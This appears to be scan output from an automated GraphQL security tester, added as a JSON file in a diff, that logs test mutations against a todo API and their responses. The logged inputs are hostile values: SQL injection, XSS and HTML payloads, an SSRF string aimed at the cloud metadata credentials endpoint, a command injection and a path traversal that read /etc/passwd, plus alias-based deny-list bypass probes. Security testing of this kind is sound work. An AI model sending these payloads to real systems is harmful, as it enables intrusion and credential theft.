@@ -1,0 +1,389 @@
+[
+  {
+    "query": {
+      "query": "\nmutation {\n  updateTodo(id: \"1\", input: { title: \"1' OR '1'='1'; -- Attempt SQLi\", completed: false }) {\n    id\n    title\n    completed\n    user {\n      id\n      username\n      email\n    }\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 2.753,
+    "timestamp": "2025-10-06T01:50:43.412899Z",
+    "count": 1,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "updateTodo": {
+          "id": "1",
+          "title": "1' OR '1'='1'; -- Attempt SQLi",
+          "completed": false,
+          "user": {
+            "id": "1",
+            "username": "Bret",
+            "email": "Sincere@april.biz"
+          }
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updateTodo(id: \"3\", input: { title: \"<script>alert('xss')</script>\", completed: false }) {\n    id\n    title\n    completed\n    user {\n      id\n      username\n      email\n    }\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 2.326,
+    "timestamp": "2025-10-06T01:50:48.047150Z",
+    "count": 2,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "updateTodo": {
+          "id": "3",
+          "title": "<script>alert('xss')</script>",
+          "completed": false,
+          "user": {
+            "id": "1",
+            "username": "Bret",
+            "email": "Sincere@april.biz"
+          }
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updateTodo(id: \"5\", input: { title: \"fetch://http://169.254.169.254/latest/meta-data/iam/security-credentials/\", completed: false }) {\n    id\n    title\n    completed\n    user {\n      id\n      username\n      email\n    }\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 2.535,
+    "timestamp": "2025-10-06T01:50:53.110036Z",
+    "count": 3,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "updateTodo": {
+          "id": "5",
+          "title": "fetch://http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+          "completed": false,
+          "user": {
+            "id": "1",
+            "username": "Bret",
+            "email": "Sincere@april.biz"
+          }
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updateTodo(id: \"7\", input: { title: \"check; cat /etc/passwd; echo done\", completed: false }) {\n    id\n    title\n    completed\n    user {\n      id\n      username\n      email\n    }\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 2.193,
+    "timestamp": "2025-10-06T01:50:58.307656Z",
+    "count": 4,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "updateTodo": {
+          "id": "7",
+          "title": "check; cat /etc/passwd; echo done",
+          "completed": false,
+          "user": {
+            "id": "1",
+            "username": "Bret",
+            "email": "Sincere@april.biz"
+          }
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updateTodo(id: \"9\", input: { title: \"../../../../etc/passwd\", completed: false }) {\n    id\n    title\n    completed\n    user {\n      id\n      username\n      email\n    }\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 2.211,
+    "timestamp": "2025-10-06T01:51:02.325268Z",
+    "count": 5,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "updateTodo": {
+          "id": "9",
+          "title": "../../../../etc/passwd",
+          "completed": false,
+          "user": {
+            "id": "1",
+            "username": "Bret",
+            "email": "Sincere@april.biz"
+          }
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updateTodo(id: \"11\", input: { title: \"<img src=x onerror=\\\"alert('html')\\\">\", completed: false }) {\n    id\n    title\n    completed\n    user {\n      id\n      username\n      email\n    }\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 2.852,
+    "timestamp": "2025-10-06T01:51:08.049551Z",
+    "count": 6,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "updateTodo": {
+          "id": "11",
+          "title": "<img src=x onerror=\"alert('html')\">",
+          "completed": false,
+          "user": {
+            "id": "1",
+            "username": "Bret",
+            "email": "Sincere@april.biz"
+          }
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updateTodo(id: \"2\", input: { title: \"ACL bypass test - normal\", completed: true }) {\n    id\n    title\n    completed\n    user {\n      id\n      username\n      email\n    }\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 1.952,
+        "timestamp": "2025-10-06T01:51:12.517252Z",
+        "response_body": {
+          "data": {
+            "updateTodo": {
+              "id": "2",
+              "title": "ACL bypass test - normal",
+              "completed": true,
+              "user": {
+                "id": "1",
+                "username": "Bret",
+                "email": "Sincere@april.biz"
+              }
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 2.512,
+        "timestamp": "2025-10-06T01:51:15.029129Z",
+        "response_body": {
+          "data": {
+            "s": {
+              "id": "2",
+              "title": "ACL bypass test - aliased",
+              "completed": true,
+              "user": {
+                "id": "1",
+                "username": "Bret",
+                "email": "Sincere@april.biz"
+              }
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 7,
+    "timestamp": "2025-10-06T01:51:15.029230Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 2.179,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  s: updateTodo(id: \"2\", input: { title: \"ACL bypass test - aliased\", completed: true }) {\n    id\n    title\n    completed\n    user {\n      id\n      username\n      email\n    }\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 3.04,
+        "timestamp": "2025-10-06T01:51:22.433599Z",
+        "response_body": {
+          "data": {
+            "updateTodo": {
+              "id": "2",
+              "title": "ACL bypass test - normal",
+              "completed": true,
+              "user": {
+                "id": "1",
+                "username": "Bret",
+                "email": "Sincere@april.biz"
+              }
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 2.266,
+        "timestamp": "2025-10-06T01:51:24.699348Z",
+        "response_body": {
+          "data": {
+            "s": {
+              "id": "2",
+              "title": "ACL bypass test - aliased",
+              "completed": true,
+              "user": {
+                "id": "1",
+                "username": "Bret",
+                "email": "Sincere@april.biz"
+              }
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 8,
+    "timestamp": "2025-10-06T01:51:24.699429Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 2.359,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  updateTodo {\n    types {\n      name\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 3.201,
+    "timestamp": "2025-10-06T01:51:33.080864Z",
+    "count": 9,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"updateTodo\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updateTodo(id: \"1\", input: { title: \"check suggestions\", completed: false }) {\n    id\n    titel\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 2.367,
+    "timestamp": "2025-10-06T01:51:37.129818Z",
+    "count": 10,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"titel\" on type \"Todo\". Did you mean \"title\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updateTodo(id: \"42\", input: { title: \"Mark API testing basic update\", completed: true }) {\n    id\n    title\n    completed\n    user {\n      id\n      username\n      email\n    }\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 3.139,
+    "timestamp": "2025-10-06T01:51:42.036896Z",
+    "count": 11,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "updateTodo": {
+          "id": "42",
+          "title": "Mark API testing basic update",
+          "completed": true,
+          "user": {
+            "id": "3",
+            "username": "Samantha",
+            "email": "Nathan@yesenia.net"
+          }
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  }
+]
